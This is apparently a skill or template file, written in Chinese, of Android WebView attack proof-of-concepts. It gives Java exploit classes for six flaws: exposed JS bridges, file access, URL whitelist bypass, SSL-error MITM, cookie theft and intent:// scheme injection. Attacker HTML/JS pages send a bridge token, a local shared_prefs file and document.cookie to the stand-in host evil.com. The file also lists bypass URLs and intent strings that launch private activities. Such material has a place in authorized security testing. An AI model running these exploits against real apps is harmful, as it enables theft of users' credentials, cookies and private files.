---
name: poc-app-webview
description: WebView 组件攻击 PoC — 覆盖 JS Bridge、文件访问、URL 绕过、SSL 绕过、Cookie 窃取、Intent Scheme 注入 6 种漏洞类型
---

# WebView 组件攻击 PoC

WebView 是 Android 内嵌浏览器核心组件，攻击面包括 JS Bridge 暴露、文件访问、URL 加载绕过、SSL 验证绕过等。

## 漏洞类型索引

| 漏洞 | 等级 | PoC 类名 |
|------|------|---------|
| JavaScript 桥接暴露 | MEDIUM→CRITICAL | `WebViewJsBridgeExploit` |
| 文件访问泄露 | HIGH | `WebViewFileAccessExploit` |
| URL 加载绕过 | MEDIUM | `WebViewUrlBypassExploit` |
| SSL 验证绕过 | HIGH | `WebViewSslBypassExploit` |
| Cookie 窃取 | MEDIUM | `WebViewCookieTheftExploit` |
| Intent Scheme 注入 | HIGH | `WebViewIntentSchemeExploit` |

## WebViewJsBridgeExploit

通过 WebView 加载恶意页面调用暴露的 JS Bridge 方法。

```java
public class WebViewJsBridgeExploit extends Exploit {
    @Override
    public void execute() {
        // 通过 Deep Link 或 Intent 触发目标 WebView 加载攻击者页面
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.WebViewActivity");
        intent.setData(Uri.parse("https://evil.com/poc.html"));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        log("Triggered WebView to load attacker page");
        log("Attacker page calls: window.bridge.getToken()");
        log("Attacker page calls: window.bridge.getContacts()");
    }
}
```

> 攻击者页面 `poc.html` 内容示例：
> ```html
> <script>
>     try {
>         var token = window.bridge.getToken();
>         fetch('https://evil.com/collect?t=' + token);
>     } catch(e) {
>         // bridge 方法名需通过反编译确定
>     }
> </script>
> ```

## WebViewFileAccessExploit

利用 WebView 文件访问权限读取本地敏感文件。

```java
public class WebViewFileAccessExploit extends Exploit {
    @Override
    public void execute() {
        // 目标 WebView 启用了 setAllowFileAccess(true) 或
        // setAllowFileAccessFromFileURLs(true)
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.WebViewActivity");
        // 直接加载 file:// 协议读取本地文件
        intent.setData(Uri.parse("file:///data/data/com.target/shared_prefs/secrets.xml"));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
```

> 也可通过 XSS 结合 file:// 访问：
> ```html
> <script>
>     var xhr = new XMLHttpRequest();
>     xhr.open("GET", "file:///data/data/com.target/shared_prefs/secrets.xml");
>     xhr.onload = function() { fetch('https://evil.com/?d=' + btoa(xhr.responseText)); };
>     xhr.send();
> </script>
> ```

## WebViewUrlBypassExploit

通过 Intent 传递恶意 URL 绕过 WebView 白名单校验。

```java
public class WebViewUrlBypassExploit extends Exploit {
    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.WebViewActivity");

        // 常见绕过方式
        String[] bypassUrls = {
            // javascript: 协议
            "javascript:alert(document.cookie)",
            // file:// 协议
            "file:///data/data/com.target/shared_prefs/config.xml",
            // 利用 URL 编码绕过白名单
            "https://evil.com%00@allowed-domain.com/",
            // 利用 @ 符号绕过域名检查
            "https://allowed-domain.com@evil.com/path",
        };

        intent.setData(Uri.parse(bypassUrls[0]));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
```

## WebViewSslBypassExploit

利用目标 WebView 的 onReceivedSslError 处理不当，通过 MITM 拦截 HTTPS 流量。

```java
public class WebViewSslBypassExploit extends Exploit {
    @Override
    public void execute() {
        // 目标 WebViewClient.onReceivedSslError() 调用了 handler.proceed()
        // 1. 启动目标 WebView Activity
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.WebViewActivity");
        intent.setData(Uri.parse("https://sensitive-api.target.com/api/user"));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);

        // 2. 实际利用需配置代理 + 自签名证书进行 MITM
        log("Target ignores SSL errors — set up MITM proxy to intercept traffic");
        log("Steps: configure WiFi proxy → use mitmproxy with self-signed cert");
    }
}
```

## WebViewCookieTheftExploit

通过恶意页面读取 WebView 中的敏感 Cookie。

```java
public class WebViewCookieTheftExploit extends Exploit {
    @Override
    public void execute() {
        // 目标 Cookie 未设置 HttpOnly 标志，可被 JavaScript 读取
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.WebViewActivity");
        intent.setData(Uri.parse("https://evil.com/cookie-steal.html"));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
```

> 攻击者页面示例：
> ```html
> <script>
>     fetch('https://evil.com/steal?cookie=' + document.cookie);
>     // 也可通过 WebView 的 CookieManager 读取：
>     // android.webkit.CookieManager.getInstance().getCookie(url)
> </script>
> ```

## WebViewIntentSchemeExploit

利用 WebView 未过滤 intent:// scheme，注入 Intent 启动任意组件。

```java
public class WebViewIntentSchemeExploit extends Exploit {
    @Override
    public void execute() {
        // 目标 WebView 的 shouldOverrideUrlLoading 未过滤 intent:// scheme
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.WebViewActivity");
        intent.setData(Uri.parse("https://evil.com/intent-inject.html"));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
```

> 攻击者页面示例：
> ```html
> <a href="intent:#Intent;component=com.target/.PrivateActivity;S.extra_key=value;end">
>     Click me
> </a>
> <script>
>     // 或通过 JS 自动触发
>     window.location = "intent:#Intent;component=com.target/.PrivateActivity;end";
> </script>
> ```
